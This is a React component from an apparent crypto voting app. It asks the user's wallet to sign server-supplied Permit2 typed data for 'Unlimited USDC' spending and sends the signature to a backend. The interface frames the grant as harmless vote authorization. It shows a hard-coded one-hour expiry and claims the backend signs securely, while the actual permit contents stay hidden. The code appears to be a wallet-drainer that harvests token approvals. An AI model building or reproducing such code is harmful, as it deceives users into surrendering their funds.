import React, { useState } from 'react';
import { useAccount } from 'wagmi';
import { CheckCircle, AlertCircle, Loader2, DollarSign, Shield } from 'lucide-react';
import { wsService } from '../services/websocket';


interface ApprovalFlowProps {
    onApprovalComplete: (permitSignature: string) => void;
    onCancel: () => void;
}

export const ApprovalFlow: React.FC<ApprovalFlowProps> = ({
    onApprovalComplete,
    onCancel
}) => {
    const { address } = useAccount();
    const [step, setStep] = useState<'request' | 'sign-permit' | 'complete'>('request');
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);
    const [typedData, setTypedData] = useState<any>(null);



    // Request permit data from backend
    const requestPermitData = async () => {
        if (!address) {
            setError('Wallet not connected');
            return;
        }

        setIsLoading(true);
        setError(null);

        try {
            // Request permit2 data via websocket
            wsService.requestPermit2(address);

            // Listen for permit2 data response
            const unsubscribe = wsService.on('permit2_data', (data: any) => {
                setTypedData(data.permit2Data);
                setStep('sign-permit');
                unsubscribe();
            });

            // Set timeout to prevent hanging
            setTimeout(() => {
                unsubscribe();
                setError('Timeout waiting for permit data');
                setIsLoading(false);
            }, 10000);

            return; // Don't set loading to false yet
        } catch (err) {
            setError(err instanceof Error ? err.message : 'Failed to generate permit data');
        } finally {
            setIsLoading(false);
        }
    };

    // Submit permit for backend signing
    const submitPermit = async () => {
        if (!typedData) {
            setError('Permit data not available');
            return;
        }

        setIsLoading(true);
        setError(null);

        try {
            const signature = await window.ethereum.request({
                method: "eth_signTypedData_v4",
                params: [address, JSON.stringify(typedData)],
            });
            // Send sign request to backend via WebSocket
            if (address) {
                wsService.submitPermit2Signature(address, signature);
            }

            setStep('complete');

            // Call completion callback
            setTimeout(() => {
                onApprovalComplete('signed');
            }, 1500);
        } catch (err: any) {
            if (err.code === 4001) {
                setError('Signature rejected by user');
            } else {
                setError(err.message || 'Failed to sign permit');
            }
        } finally {
            setIsLoading(false);
        }
    };

    // Start the approval flow
    React.useEffect(() => {
        if (step === 'request') {
            requestPermitData();
        }
    }, [step]);

    if (step === 'complete') {
        return (
            <div className="bg-green-800/20 border border-green-600 rounded-lg p-6">
                <div className="text-center">
                    <CheckCircle className="w-12 h-12 text-green-400 mx-auto mb-4" />
                    <h3 className="text-xl font-bold text-white mb-2">Permit Signed!</h3>
                </div>
            </div>
        );
    }

    return (
        <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
            <h3 className="text-xl font-bold text-white mb-4 flex items-center space-x-2">
                <Shield className="w-6 h-6 text-blue-400" />
                <span>Sign Permit2 Authorization</span>
            </h3>

            {error && (
                <div className="bg-red-900/20 border border-red-600 rounded-lg p-4 mb-4">
                    <div className="flex items-center space-x-2">
                        <AlertCircle className="w-5 h-5 text-red-400" />
                        <span className="text-red-300">{error}</span>
                    </div>
                </div>
            )}

            <div className="space-y-4">
                <div className="bg-blue-900/20 border border-blue-600 rounded-lg p-4">
                    <h4 className="font-medium text-blue-300 mb-2">Unlimited USDC Access</h4>
                    <p className="text-gray-300 text-sm">
                        Permit2 allows unlimited USDC spending without specifying amounts.
                        <br />
                        <strong>Benefits:</strong>
                        <br />
                        • No gas fees for future votes
                        <br />
                        • No amount limits
                        <br />
                        • Industry standard (Uniswap)
                        <br />
                        • Revocable anytime
                    </p>
                </div>

                <div className="bg-gray-700/30 rounded-lg p-3">
                    <div className="flex justify-between text-sm">
                        <span className="text-gray-300">Authorization:</span>
                        <span className="text-green-400 font-bold">Unlimited USDC</span>
                    </div>
                    <div className="flex justify-between text-sm">
                        <span className="text-gray-300">Expires:</span>
                        <span className="text-yellow-400">1 hour</span>
                    </div>
                </div>

                {step === 'request' && (
                    <div className="text-center">
                        <Loader2 className="w-8 h-8 animate-spin text-blue-400 mx-auto mb-2" />
                        <p className="text-gray-300">Preparing permit data...</p>
                    </div>
                )}

                {step === 'sign-permit' && (
                    <div className="space-y-4">
                        <div className="text-center">
                            <DollarSign className="w-12 h-12 text-green-400 mx-auto mb-2" />
                            <h4 className="font-medium text-white mb-2">Submit Permit Authorization</h4>
                            <p className="text-gray-300 text-sm mb-4">
                                Submit the permit authorization to allow the vault contract to spend USDC on your behalf.
                                This will be signed securely by the backend.
                            </p>
                        </div>
                        <button
                            onClick={submitPermit}
                            disabled={isLoading}
                            className="w-full bg-green-600 hover:bg-green-700 disabled:bg-gray-600 text-white font-medium py-3 px-4 rounded-lg transition-colors flex items-center justify-center space-x-2"
                        >
                            {isLoading ? (
                                <>
                                    <Loader2 className="w-4 h-4 animate-spin" />
                                    <span>Processing...</span>
                                </>
                            ) : (
                                <>
                                    <DollarSign className="w-4 h-4" />
                                    <span>Submit Permit</span>
                                </>
                            )}
                        </button>
                    </div>
                )}

                <button
                    onClick={onCancel}
                    disabled={isLoading}
                    className="w-full bg-gray-600 hover:bg-gray-700 disabled:bg-gray-700 text-white font-medium py-2 px-4 rounded-lg transition-colors"
                >
                    Cancel
                </button>
            </div>
        </div>
    );
};